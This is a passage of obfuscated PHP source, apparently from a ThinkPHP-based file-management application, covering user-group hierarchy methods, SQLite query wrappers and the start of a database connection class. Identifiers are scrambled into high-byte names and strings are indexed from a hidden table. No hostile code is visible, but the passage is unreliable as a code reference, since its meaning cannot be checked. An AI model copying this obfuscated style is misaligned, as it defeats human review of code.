isset($úü†Á²[$½ÂÚÍÂ]) ? intval($úü†Á²[$½ÂÚÍÂ]) : !1; } unset($½¦ş‚ºò); } private function _listAppendChildrenMember(&$ú‹€İã¶) { $Š—›Âş =& $_SERVER[ñ÷§¡å]; $ÑÂèÉµ¤ = array_to_keyvalue($ú‹€İã¶, $Š—›Âş[12], $Š—›Âş[1835]); $úù·Ç‰ä = array($Š—›Âş[1835] => array($Š—›Âş[7], $ÑÂèÉµ¤)); $©Şâ•Ä = array($Š—›Âş[1835], $Š—›Âş[1935] => $Š—›Âş[509]); $áœçµê = Model($Š—›Âş[1925])->field($©Şâ•Ä)->where($úù·Ç‰ä)->group($Š—›Âş[1835])->select(); $”¦šëì = array_to_keyvalue($áœçµê, $Š—›Âş[1835], $Š—›Âş[509]); foreach ($ú‹€İã¶ as &$¾Ë×Œç) { $Ã¥ºëîÓ = $¾Ë×Œç[$Š—›Âş[1835]]; $¾Ë×Œç[$Š—›Âş[1937]] = isset($”¦šëì[$Ã¥ºëîÓ]) ? intval($”¦šëì[$Ã¥ºëîÓ]) : !1; } unset($¾Ë×Œç); } private function _listAppendMeta(&$áƒ´î­ê, $ë¶ëç²É) { $Ø¨’šŸ¾ =& $_SERVER[ñ÷§¡å]; $ûÑÑ¼Ö© = array($Ø¨’šŸ¾[1835] => array($Ø¨’šŸ¾[7], $ë¶ëç²É)); $åçõˆÜÌ = Model($Ø¨’šŸ¾[1924])->where($ûÑÑ¼Ö©)->select(); $åçõˆÜÌ = array_to_keyvalue_group($åçõˆÜÌ, $Ø¨’šŸ¾[1835]); foreach ($åçõˆÜÌ as &$ÁÅ¾ÆÙš) { $ÁÅ¾ÆÙš = array_to_keyvalue($ÁÅ¾ÆÙš, $Ø¨’šŸ¾[104], $Ø¨’šŸ¾[383]); } unset($ÁÅ¾ÆÙš); foreach ($áƒ´î­ê as &$†«Ù¦¥ò) { $†«Ù¦¥ò[$Ø¨’šŸ¾[475]] = array(); if (isset($åçõˆÜÌ[$†«Ù¦¥ò[$Ø¨’šŸ¾[1835]]])) { $†«Ù¦¥ò[$Ø¨’šŸ¾[475]] = $åçõˆÜÌ[$†«Ù¦¥ò[$Ø¨’šŸ¾[1835]]]; } } unset($†«Ù¦¥ò); } protected function parentLevelArray($®ıŸ„²Ë) { $óûßÁé™ =& $_SERVER[ñ÷§¡å]; $®ıŸ„²Ë = explode($óûßÁé™[50], trim($®ıŸ„²Ë, $óûßÁé™[50])); $®ıŸ„²Ë = array_remove_value($®ıŸ„²Ë, $óûßÁé™[207]); return $®ıŸ„²Ë; } protected function parentInGroup($–µØÇ¸é, $ŠçˆÁ™æ) { $–°£š¥ä =& $_SERVER[ñ÷§¡å]; $ê‰°õ–– = $this->getInfoSimple($–µØÇ¸é); if (!$ê‰°õ––) { return !0; } $ŞØÁèÓ¸ = $this->parentLevelArray($ê‰°õ––[$–°£š¥ä[530]]); $ŞØÁèÓ¸[] = $–µØÇ¸é; foreach ($ŞØÁèÓ¸ as $–µØÇ¸é) { if (in_array($–µØÇ¸é . $–°£š¥ä[12], $ŠçˆÁ™æ)) { return !0; } } return !1; } private function _listAppendParent(&$™Õµ¡Œ”) { $é¡Æ‰ï =& $_SERVER[ñ÷§¡å]; $‰à÷Ûâƒ = array(); foreach ($™Õµ¡Œ” as &$ÁÍÉÑ¦º) { $‰à÷Ûâƒ[$ÁÍÉÑ¦º[$é¡Æ‰ï[1835]]] = $ÁÍÉÑ¦º[$é¡Æ‰ï[32]]; $Øº»¦ç = $this->parentLevelArray($ÁÍÉÑ¦º[$é¡Æ‰ï[530]]); foreach ($Øº»¦ç as $…Ûú™ñ§) { if (!isset($‰à÷Ûâƒ[$…Ûú™ñ§])) { $‰à÷Ûâƒ[$…Ûú™ñ§] = 0; } } } unset($ÁÍÉÑ¦º); foreach ($‰à÷Ûâƒ as $Ë¤ïµÂ¨ => $ïŒõàü³) { if ($ïŒõàü³) { continue; } $ÒæöùèÉ = $this->getInfoSimple($Ë¤ïµÂ¨); $‰à÷Ûâƒ[$Ë¤ïµÂ¨] = $ÒæöùèÉ[$é¡Æ‰ï[32]]; } $íàçÇ• = $GLOBALS[$é¡Æ‰ï[6]][$é¡Æ‰ï[99]][$é¡Æ‰ï[1938]]; if ($GLOBALS[$é¡Æ‰ï[512]] == $é¡Æ‰ï[98]) { $íàçÇ• = !1; } foreach ($™Õµ¡Œ” as &$ÁÍÉÑ¦º) { $Øº»¦ç = $this->parentLevelArray($ÁÍÉÑ¦º[$é¡Æ‰ï[530]]); $Äàª—ªô = $é¡Æ‰ï[12]; foreach ($Øº»¦ç as $Ë¤ïµÂ¨ => $…Ûú™ñ§) { if ($íàçÇ• && $Ë¤ïµÂ¨ == 0) { continue; } $Äàª—ªô .= $‰à÷Ûâƒ[$…Ûú™ñ§] . $é¡Æ‰ï[8]; } if ($Øº»¦ç) { $Äàª—ªô .= $ÁÍÉÑ¦º[$é¡Æ‰ï[32]]; } $ÁÍÉÑ¦º[$é¡Æ‰ï[535]] = str_replace($é¡Æ‰ï[538], $é¡Æ‰ï[8], $Äàª—ªô); } unset($ÁÍÉÑ¦º); } private function _listAppendSourceRoot(&$û„ê®¨Œ, $®ƒŠïƒô) { $Ğ¦¥¬ı =& $_SERVER[ñ÷§¡å]; $¬ù€– = Model($Ğ¦¥¬ı[838])->listSourceRoot(SourceModel::TYPE_GROUP, $®ƒŠïƒô); $¬ù€– = array_to_keyvalue($¬ù€–, $Ğ¦¥¬ı[514]); $¬ù€– = array_remove_key($¬ù€–, $Ğ¦¥¬ı[514]); foreach ($û„ê®¨Œ as &$­Ç×ˆ­Ù) { $­Ç×ˆ­Ù[$Ğ¦¥¬ı[96]] = $¬ù€–[$­Ç×ˆ­Ù[$Ğ¦¥¬ı[1835]]] ? $¬ù€–[$­Ç×ˆ­Ù[$Ğ¦¥¬ı[1835]]] : array(); } unset($­Ç×ˆ­Ù); } protected function groupMerge($ íú‘Ú£) { $ íú‘Ú£ = array_values(array_unique($ íú‘Ú£)); $•Ä‚¢Û = array(); for ($Ï¾Ôåß = 0; $Ï¾Ôåß < count($ íú‘Ú£); $Ï¾Ôåß++) { $±²§èÌ’ = !1; for ($“­¼‡¢Ú = 0; $“­¼‡¢Ú < count($ íú‘Ú£); $“­¼‡¢Ú++) { if ($Ï¾Ôåß == $“­¼‡¢Ú) { continue; } if ($this->isParentOf($ íú‘Ú£[$“­¼‡¢Ú], $ íú‘Ú£[$Ï¾Ôåß])) { $±²§èÌ’ = !0; break; } } if (!$±²§èÌ’) { $•Ä‚¢Û[] = $ íú‘Ú£[$Ï¾Ôåß]; } } return $•Ä‚¢Û; } protected function isParentOf($­á‘‹€¼, $“‚“ŒÓ) { $Êğš¸Á =& $_SERVER[ñ÷§¡å]; if (!$­á‘‹€¼ || !$“‚“ŒÓ || $­á‘‹€¼ == $“‚“ŒÓ) { return !1; } $ì‡‡àÏÖ = $this->getInfoSimple($­á‘‹€¼); $ü¥óº—‚ = $this->getInfoSimple($“‚“ŒÓ); $Óàê¢« = $ì‡‡àÏÖ[$Êğš¸Á[530]] . $­á‘‹€¼ . $Êğš¸Á[50]; if (substr($ü¥óº—‚[$Êğš¸Á[530]], 0, strlen($Óàê¢«)) == $Óàê¢«) { return !0; } return !1; } public function groupShowRoot($íØÆÀšº, $Á¥¨§ê’ = false) { $ëÛÛÉáœ =& $_SERVER[ñ÷§¡å]; $Ö‡­Õ = $this->getInfo($íØÆÀšº); if (!$Ö‡­Õ) { return array(); } $·¸±Ó§× = $this->parentLevelArray($Ö‡­Õ[$ëÛÛÉáœ[530]]); $ı»¿‚äğ = array($íØÆÀšº); if (count($·¸±Ó§×) == 0) { return $ı»¿‚äğ; } if ($Á¥¨§ê’ && count($·¸±Ó§×) == 1) { return $ı»¿‚äğ; } if (!$Ö‡­Õ[$ëÛÛÉáœ[475]] || !isset($Ö‡­Õ[$ëÛÛÉáœ[475]][$ëÛÛÉáœ[1921]]) || $Ö‡­Õ[$ëÛÛÉáœ[475]][$ëÛÛÉáœ[1921]] == $ëÛÛÉáœ[1890]) { return $this->groupShowRoot($·¸±Ó§×[count($·¸±Ó§×) - 1], $Á¥¨§ê’); } if ($Ö‡­Õ[$ëÛÛÉáœ[475]][$ëÛÛÉáœ[1921]] == $ëÛÛÉáœ[366]) { $¹ß¼¸¸é = explode($ëÛÛÉáœ[50], $Ö‡­Õ[$ëÛÛÉáœ[475]][$ëÛÛÉáœ[1922]]); if ($¹ß¼¸¸é) { $ı»¿‚äğ = array_merge($ı»¿‚äğ, $¹ß¼¸¸é); } } return $ı»¿‚äğ; } protected function resetParentLevel() { $Çß¬§Ş =& $_SERVER[ñ÷§¡å]; $™®…Ç„Ó = $Çß¬§Ş[1835]; $‚±’Âƒ‹ = $this->select(); $‚±’Âƒ‹ = array_to_keyvalue($‚±’Âƒ‹, $™®…Ç„Ó); foreach ($‚±’Âƒ‹ as $÷ß‚Ó¡İ) { $ŸÎû£æ = $÷ß‚Ó¡İ; $È¡óğíÍ = array(); while ($ŸÎû£æ[$Çß¬§Ş[441]] != 0) { $È¡óğíÍ[] = $ŸÎû£æ[$Çß¬§Ş[441]]; $ŸÎû£æ = $‚±’Âƒ‹[$ŸÎû£æ[$Çß¬§Ş[441]]]; } $È¡óğíÍ[] = 0; $È¡óğíÍ = $Çß¬§Ş[50] . implode($Çß¬§Ş[50], array_reverse($È¡óğíÍ)) . $Çß¬§Ş[50]; $this->setNamePinyin($÷ß‚Ó¡İ[$™®…Ç„Ó], $÷ß‚Ó¡İ[$Çß¬§Ş[32]]); $this->where(array($™®…Ç„Ó => $÷ß‚Ó¡İ[$™®…Ç„Ó]))->save(array($Çß¬§Ş[599] => $È¡óğíÍ)); } return $‚±’Âƒ‹; } public function groupNameAuto($İñå­ÂÓ, $ƒí§Ã•Ÿ) { $ÒÃÁ•¥Ë =& $_SERVER[ñ÷§¡å]; $Şó£úê¥ = $this->where(array($ÒÃÁ•¥Ë[410] => $İñå­ÂÓ))->getField($ÒÃÁ•¥Ë[32], !0); if (!$Şó£úê¥ || !in_array($ƒí§Ã•Ÿ, $Şó£úê¥)) { return $ƒí§Ã•Ÿ; } for ($×òº”¨Ä = 1; $×òº”¨Ä <= count($Şó£úê¥) + 1; $×òº”¨Ä++) { $ôûÆÅı = $ƒí§Ã•Ÿ . "\x28{$×òº”¨Ä}\51"; if (!in_array($ôûÆÅı, $Şó£úê¥)) { return $ôûÆÅı; } } } public function groupSwitch($ÄŒçÃæß, $Ñûø’‰œ) { $”îÍíœµ =& $_SERVER[ñ÷§¡å]; $†ô†ìÈ‡ = array($”îÍíœµ[1835] => array($”îÍíœµ[7], array($ÄŒçÃæß, $Ñûø’‰œ))); $õˆ„Óğú = $this->where($†ô†ìÈ‡)->select(); $õˆ„Óğú = array_to_keyvalue($õˆ„Óğú, $”îÍíœµ[1835]); if (!isset($õˆ„Óğú[$ÄŒçÃæß]) || !isset($õˆ„Óğú[$Ñûø’‰œ]) || $õˆ„Óğú[$ÄŒçÃæß][$”îÍíœµ[441]] == 0) { return !1; } $†ô†ìÈ‡ = array($”îÍíœµ[1835] => $ÄŒçÃæß); $óº¶Şğ = Model($”îÍíœµ[1925])->where($†ô†ìÈ‡)->select(); if (!$óº¶Şğ) { $óº¶Şğ = array(); } foreach ($óº¶Şğ as $±¡”¶ĞÆ) { $‘¿©Â‘£ = $±¡”¶ĞÆ[$”îÍíœµ[1663]]; $†ô†ìÈ‡ = array($”îÍíœµ[1663] => $‘¿©Â‘£, $”îÍíœµ[1835] => $Ñûø’‰œ); $£­Çà°ƒ = Model($”îÍíœµ[1925])->where($†ô†ìÈ‡)->find(); if (!$£­Çà°ƒ) { $Ö¸ØÊˆç = array($Ñûø’‰œ => $±¡”¶ĞÆ[$”îÍíœµ[1939]]); Model($”îÍíœµ[544])->userGroupAdd($‘¿©Â‘£, $Ö¸ØÊˆç); } Model($”îÍíœµ[544])->userGroupRemove($‘¿©Â‘£, $ÄŒçÃæß); } $†ô†ìÈ‡ = array($”îÍíœµ[420] => 2, $”îÍíœµ[441] => 0, $”îÍíœµ[419] => 1, $”îÍíœµ[514] => array($”îÍíœµ[7], array($ÄŒçÃæß, $Ñûø’‰œ))); $ĞÃ¤ÂŠü = Model($”îÍíœµ[838])->where($†ô†ìÈ‡)->field($”îÍíœµ[1940])->select(); $ĞÃ¤ÂŠü = array_to_keyvalue($ĞÃ¤ÂŠü, $”îÍíœµ[514], $”îÍíœµ[411]); $öæ¿ØÏ = !empty($ĞÃ¤ÂŠü[$ÄŒçÃæß]) ? $ĞÃ¤ÂŠü[$ÄŒçÃæß] : !1; if ($öæ¿ØÏ) { if (!$ĞÃ¤ÂŠü[$Ñûø’‰œ]) { $ĞÃ¤ÂŠü[$Ñûø’‰œ] = Model($”îÍíœµ[838])->groupRootAdd($Ñûø’‰œ); } $‡¡Äï› = $ĞÃ¤ÂŠü[$Ñûø’‰œ]; $†ô†ìÈ‡ = array($”îÍíœµ[441] => $öæ¿ØÏ); $ĞÃ¤ÂŠü = Model($”îÍíœµ[838])->where($†ô†ìÈ‡)->field($”îÍíœµ[1941])->select(); if (!$ĞÃ¤ÂŠü) { $ĞÃ¤ÂŠü = array(); } Model($”îÍíœµ[838])->moveClearAuth = !1; foreach ($ĞÃ¤ÂŠü as $ˆ¡ÛÒò¾) { $ßëˆèÚò = $ˆ¡ÛÒò¾[$”îÍíœµ[419]] == $”îÍíœµ[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($”îÍíœµ[838])->move($ˆ¡ÛÒò¾[$”îÍíœµ[411]], $‡¡Äï›, $ßëˆèÚò); } Model($”îÍíœµ[838])->moveClearAuth = !0; $†ô†ìÈ‡ = array($”îÍíœµ[420] => 2, $”îÍíœµ[514] => $ÄŒçÃæß); $–ËâƒÙ = array($”îÍíœµ[514] => $Ñûø’‰œ); Model($”îÍíœµ[1942])->where($†ô†ìÈ‡)->save($–ËâƒÙ); Model($”îÍíœµ[1943])->where($†ô†ìÈ‡)->save($–ËâƒÙ); } $this->_changeChildLevel($õˆ„Óğú[$ÄŒçÃæß], $õˆ„Óğú[$Ñûø’‰œ], !0); $this->where(array($”îÍíœµ[441] => $ÄŒçÃæß))->save(array($”îÍíœµ[441] => $Ñûø’‰œ)); $this->_clearChildrenCache($õˆ„Óğú[$Ñûø’‰œ]); return !0; } } goto f¤Ìõóê‡; DÂ·‘Ş¨’î: class DbSqlite extends DbSqliteBase { public function query($´â’‘©) { $÷Î¥È½ =& $_SERVER[ñ÷§¡å]; if (!CacheLock::fileLock($÷Î¥È½[13])) { return !1; } $ƒ›’ÈÌÏ = parent::query($´â’‘©); CacheLock::fileUnLock($÷Î¥È½[13]); return $ƒ›’ÈÌÏ; } public function execute($â›˜úšØ) { $ÆË¹ô¡ª =& $_SERVER[ñ÷§¡å]; if (!CacheLock::fileLock($ÆË¹ô¡ª[13])) { return !1; } $‡æã¸…Ç = parent::execute($â›˜úšØ); CacheLock::fileUnLock($ÆË¹ô¡ª[13]); return $‡æã¸…Ç; } } class DbSqlite3 extends DbSqlite3Base { public function query($‚ ˜¨) { $£—óü€£ =& $_SERVER[ñ÷§¡å]; if (!CacheLock::fileLock($£—óü€£[13])) { return !1; } $©§ÛİËû = parent::query($‚ ˜¨); CacheLock::fileUnLock($£—óü€£[13]); return $©§ÛİËû; } public function execute($’Ç€óÔ¥) { $ÕÂÛâ“ƒ =& $_SERVER[ñ÷§¡å]; if (!CacheLock::fileLock($ÕÂÛâ“ƒ[13])) { return !1; } $Ô—Øş¥¹ = parent::execute($’Ç€óÔ¥); CacheLock::fileUnLock($ÕÂÛâ“ƒ[13]); return $Ô—Øş¥¹; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\161" => "\74\76", "\x67\x74" => "\x3e", "\x65\x67\x74" => "\x3e\75", "\154\164" => "\74", "\x65\x6c\164" => "\74\75", "\x6e\157\x74\154\151\x6b\x65" => "\x4e\117\x54\x20\x4c\111\x4b\105", "\154\151\153\145" => "\x4c\111\x4b\105", "\151\x6e" => "\x49\x4e", "\x6e\x6f\164\151\x6e" => "\x4e\117\x54\40\x49\116", "\156\x6f\164\40\151\156" => "\x4e\x4f\124\40\111\x4e", "\x62\145\x74\167\x65\x65\156" => "\102\x45\x54\x57\105\105\116", "\x6e\x6f\x74\x62\145\164\167\x65\145\x6e" => "\116\117\124\x20\x42\x45\x54\127\105\x45\x4e", "\156\157\x74\x20\x62\x65\x74\167\x65\x65\x6e" => "\x4e\117\x54\x20\x42\x45\124\127\x45\x45\116"); protected $selectSql = "\x53\105\x4c\105\103\124\x25\x44\111\123\124\111\x4e\x43\x54\x25\40\x25\106\111\105\x4c\x44\x25\x20\x46\x52\x4f\115\x20\x25\x54\x41\x42\x4c\x45\45\45\x4a\x4f\111\x4e\45\45\x57\110\105\x52\x45\x25\x25\107\122\x4f\125\x50\45\45\x48\101\x56\x49\116\107\x25\x25\117\x52\x44\x45\122\x25\45\114\x49\x4d\x49\x54\x25\x20\x25\x55\116\111\x4f\116\45\45\103\x4f\115\115\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $³æ¼€½ø = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ñ÷§¡å][967], $³æ¼€½ø); } public function factory($¿‘¶”Ÿ¡ = '') { $ŸÓ–´È =& $_SERVER[ñ÷§¡å]; $¿‘¶”Ÿ¡ = $this->parseConfig($¿‘¶”Ÿ¡); if (empty($¿‘¶”Ÿ¡[$ŸÓ–´È[968]])) { think_exception(think_lang($ŸÓ–´È[969])); } $this->dbType = ucwords(strtolower($¿‘¶”Ÿ¡[$ŸÓ–´È[968]])); $¬¿––ÕÎ = $ŸÓ–´È[970] . $this->dbType; if (class_exists($¬¿––ÕÎ)) { $çÆ¾ŞÑ = new $¬¿––ÕÎ($¿‘¶”Ÿ¡); if ($ŸÓ–´È[971] != strtolower($¿‘¶”Ÿ¡[$ŸÓ–´È[968]])) { $çÆ¾ŞÑ->dbType = strtoupper($this->dbType); } else { $çÆ¾ŞÑ->dbType = $this->_getDsnType($¿‘¶”Ÿ¡[$ŸÓ–´È[923]]); } } else { think_exception(think_lang($ŸÓ–´È[972]) . $ŸÓ–´È[973] . $¬¿––ÕÎ); } return $çÆ¾ŞÑ; } public function __call($ùŒñÖíÁ, $ã—¸¤Á¸) { if (method_exists($this, $ùŒñÖíÁ)) { return call_user_func_array(array($this, $ùŒñÖíÁ), $ã—¸¤Á¸); } } protected function _getDsnType($ÇĞæèã) { $†ıæ”îÔ = explode($_SERVER[ñ÷§¡å][4], $ÇĞæèã); $àèçĞî = strtoupper(trim($†ıæ”îÔ[0])); return $àèçĞî; } private function parseConfig($Ş÷òÂÒ¬ = '') { $ß¡¨®éÔ =& $_SERVER[ñ÷§¡å]; if (!empty($Ş÷òÂÒ¬) && is_string($Ş÷òÂÒ¬)) { $Ş÷òÂÒ¬ = $this->parseDSN($Ş÷òÂÒ¬); } elseif (is_array($Ş÷òÂÒ¬)) { $Ş÷òÂÒ¬ = array_change_key_case($Ş÷òÂÒ¬); $Ş÷òÂÒ¬ = array($ß¡¨®éÔ[968] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[974]], $ß¡¨®éÔ[895] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[975]], $ß¡¨®éÔ[896] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[976]], $ß¡¨®éÔ[893] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[977]], $ß¡¨®éÔ[894] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[978]], $ß¡¨®éÔ[21] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[979]], $ß¡¨®éÔ[923] => $Ş÷òÂÒ¬[$ß¡¨®éÔ[980]], $ß¡¨®éÔ[17] => isset($Ş÷òÂÒ¬[$ß¡¨®éÔ[981]]) ? $Ş÷òÂÒ¬[$ß¡¨®éÔ[981]] : array()); } elseif (empty($Ş÷òÂÒ¬)) { if (think_config($ß¡¨®éÔ[982]) && $ß¡¨®éÔ[971] != strtolower(think_config($ß¡¨®éÔ[983]))) { $Ş÷òÂÒ¬ = $this->parseDSN(think_config($ß¡¨®éÔ[982])); } else { $Ş÷òÂÒ¬ = array($ß¡¨®éÔ[968] => think_config($ß¡¨®éÔ[983]), $ß¡¨®éÔ[895] => think_config($ß¡¨®éÔ[984]), $ß¡¨®éÔ[896] => think_config($ß¡¨®éÔ[985]), $ß¡¨®éÔ[893] => think_config($ß¡¨®éÔ[986]), $ß¡¨®éÔ[894] => think_config($ß¡¨®éÔ[987]), $ß¡¨®éÔ[21] => think_config($ß¡¨®éÔ[255]), $ß¡¨®éÔ[923] => think_config($ß¡¨®éÔ[982]), $ß¡¨®éÔ[17] => think_config($ß¡¨®éÔ[988])); } } return $Ş÷òÂÒ¬; } protected function initConnect($í‚šçËâ = true) { if (1 == think_config($_SERVER[ñ÷§¡å][22])) { $this->_linkID = $this->multiConnect($í‚šçËâ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $éüáÎÀç => $‘åãÅŸ) { $this->_linkID = $‘åãÅŸ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($†æ€ƒîŠ = false) { $Ûøùõ¹  =& $_SERVER[ñ÷§¡å]; static $€¨è¸ËÊ = array(); static $ò¤›å = -1; if (empty($€¨è¸ËÊ)) { foreach ($this->config as $„öÀæÇ¿ => $„Ğ‰¡Úû) { $€¨è¸ËÊ[$„öÀæÇ¿] = explode($Ûøùõ¹ [50], $„Ğ‰¡Úû); } } if (think_config($Ûøùõ¹ [989])) { if ($†æ€ƒîŠ || think_config($Ûøùõ¹ [404]) === !0) { $¿¼ÇŸ¯’ = floor(mt_rand(0, think_config($Ûøùõ¹ [990]) - 1)); $ò¤›å = $¿¼ÇŸ¯’; } else { if (is_numeric(think_config($Ûøùõ¹ [991]))) { $¿¼ÇŸ¯’ = think_config($Ûøùõ¹ [991]); } else { $¿¼ÇŸ¯’ = floor(mt_rand(think_config($Ûøùõ¹ [990]), count($€¨è¸ËÊ[$Ûøùõ¹ [893]]) - 1)); } } } else { $¿¼ÇŸ¯’ = floor(mt_rand(0, count($€¨è¸ËÊ[$Ûøùõ¹ [893]]) - 1)); $ò¤›å = $¿¼ÇŸ¯’; } $¿¼ÇŸ¯’ = $ò¤›å !== -1 ? $ò¤›å : $¿¼ÇŸ¯’; $˜Ÿ«°¯ = array($Ûøùõ¹ [895] => isset($€¨è¸ËÊ[$Ûøùõ¹ [895]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [895]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [895]][0], $Ûøùõ¹ [896] => isset($€¨è¸ËÊ[$Ûøùõ¹ [896]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [896]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [896]][0], $Ûøùõ¹ [893] => isset($€¨è¸ËÊ[$Ûøùõ¹ [893]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [893]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [893]][0], $Ûøùõ¹ [894] => isset($€¨è¸ËÊ[$Ûøùõ¹ [894]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [894]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [894]][0], $Ûøùõ¹ [21] => isset($€¨è¸ËÊ[$Ûøùõ¹ [21]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [21]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [21]][0], $Ûøùõ¹ [923] => isset($€¨è¸ËÊ[$Ûøùõ¹ [923]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [923]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [923]][0], $Ûøùõ¹ [17] => isset($€¨è¸ËÊ[$Ûøùõ¹ [17]][$¿¼ÇŸ¯’]) ? $€¨è¸ËÊ[$Ûøùõ¹ [17]][$¿¼ÇŸ¯’] : $€¨è¸ËÊ[$Ûøùõ¹ [17]][0]); return $this->connect($˜Ÿ«°¯, $¿¼ÇŸ¯’); } public function parseDSN($İæğÊ¡Ï) { $£¤§³ŒÏ =& $_SERVER[ñ÷§¡å]; if (empty($İæğÊ¡Ï)) { return !1; } $ ±Á£Ô¦ = parse_url($İæğÊ¡Ï); if ($ ±Á£Ô¦[$£¤§³ŒÏ[190]]) { $Î¦ŠŞ¨¾ = array($£¤§³ŒÏ[968] => $ ±Á£Ô¦[$£¤§³ŒÏ[190]], $£¤§³ŒÏ[895] => isset($ ±Á£Ô¦[$£¤§³ŒÏ[609]]) ? $ ±Á£Ô¦[$£¤§³ŒÏ[609]] : $£¤§³ŒÏ[12], $£¤§³ŒÏ[896] => isset($ ±Á£Ô¦[$£¤§³ŒÏ[992]]) ? $ ±Á£Ô¦[$£¤§³ŒÏ[992]] : $£¤§³ŒÏ[12], $£¤§³ŒÏ[893] => isset($ ±Á£Ô¦[$£¤§³ŒÏ[191]]) ? $ ±Á£Ô¦[$£¤§³ŒÏ[191]] : $£¤§³ŒÏ[12], $£¤§³ŒÏ[894] => isset($ ±Á£Ô¦[$£¤§³ŒÏ[192]]) ? $ ±Á£Ô¦[$£¤§³ŒÏ[192]] : $£¤§³ŒÏ[12], $£¤§³ŒÏ[21] => isset($ ±Á£Ô¦[$£¤§³ŒÏ[94]]) ? substr($ ±Á£Ô¦[$£¤§³ŒÏ[94]], 1) : $£¤§³ŒÏ[12]); } else { preg_match($£¤§³ŒÏ[993], trim($İæğÊ¡Ï), $ê‰š²ø); $Î¦ŠŞ¨¾ = array($£¤§³ŒÏ[968] => $ê‰š²ø[1], $£¤§³ŒÏ[895] => $ê‰š²ø[2], $£¤§³ŒÏ[896] => $ê‰š²ø[3], $£¤§³ŒÏ[893] => $ê‰š²ø[4], $£¤§³ŒÏ[894] => $ê‰š²ø[5], $£¤§³ŒÏ[21] => $ê‰š²ø[6]); } $Î¦ŠŞ¨¾[$£¤§³ŒÏ[923]] = $£¤§³ŒÏ[12]; return $Î¦ŠŞ¨¾; } protected function debug() { $ø¼Š»¦ =& $_SERVER[ñ÷§¡å]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ø¼Š»¦[994]; if (think_config($ø¼Š»¦[995])) { think_status($ø¼Š»¦[996]); think_trace($this->queryStr . $ø¼Š»¦[997] . think_status($ø¼Š»¦[24], $ø¼Š»¦[996], 6) . $ø¼Š»¦[998], $ø¼Š»¦[12], $ø¼Š»¦[999]); } } protected function parseLock($Ëªıä÷œ = false) { $ÁŸ˜Îºé =& $_SERVER[ñ÷§¡å]; if (!$Ëªıä÷œ) { return $ÁŸ˜Îºé[12]; } if ($ÁŸ˜Îºé[925] == $this->dbType) { return $ÁŸ˜Îºé[1000]; } return $ÁŸ˜Îºé[1001]; } protected function parseSet($šÇù§‚Ö) { $¹İ£œĞ– =& $_SERVER[ñ÷§¡å]; foreach ($šÇù§‚Ö as $§ÎôÓéô => $Ûì°¥÷Ø) { if (is_array($Ûì°¥÷Ø) && $¹İ£œĞ–[306] == $Ûì°¥÷Ø[0]) { $—Îüåü“[] = $this->parseKey($§ÎôÓéô) . $¹İ£œĞ–[891] . $Ûì°¥÷Ø[1]; } elseif (is_scalar($Ûì°¥÷Ø) || is_null($Ûì°¥÷Ø)) { $—Îüåü“[] = $this->parseKey($§ÎôÓéô) . $¹İ£œĞ–[891] . $this->parseValue($Ûì°¥÷Ø); } } return $¹İ£œĞ–[1002] . implode($¹İ£œĞ–[50], $—Îüåü“); } protected function bindParam($ÉÌ—ñ–è, $­È–×Ôò) { $this->bind[$_SERVER[ñ÷§¡å][4] . $ÉÌ—ñ–è] = $­È–×Ôò; } protected function parseBind($ËŠ™æ„¨) { $ËŠ™æ„¨ = array_merge($this->bind, $ËŠ™æ„¨); $this->bind = array(); return $ËŠ™æ„¨; } function parseKey(&$¬¬¶Şó³, $ Ö¡Ãñù = true) { if ($ Ö¡Ãñù) { $¬¬¶Şó³ = $this->parseKeyCheck($¬¬¶Şó³); } return $¬¬¶Şó³; } function parseKeyCheck($Èñ›ôÏ) { $ß“ì¯Ñ€ =& $_SERVER[ñ÷§¡å]; $Èñ›ôÏ = trim($Èñ›ôÏ); if (!preg_match($ß“ì¯Ñ€[1003], $Èñ›ôÏ)) { think_exception($ß“ì¯Ñ€[1004] . $Èñ›ôÏ); } return $Èñ›ôÏ; } protected function parseValue($Œ’öÑ½) { $ûßæÈŒæ =& $_SERVER[ñ÷§¡å]; if (is_string($Œ’öÑ½)) { $Œ’öÑ½ = $ûßæÈŒæ[964] . $this->escapeString($Œ’öÑ½) . $ûßæÈŒæ[964]; } elseif (isset($Œ’öÑ½[0]) && is_string($Œ’öÑ½[0]) && strtolower($Œ’öÑ½[0]) == $ûßæÈŒæ[306]) { $Œ’öÑ½ = $this->escapeString($Œ’öÑ½[1]); } 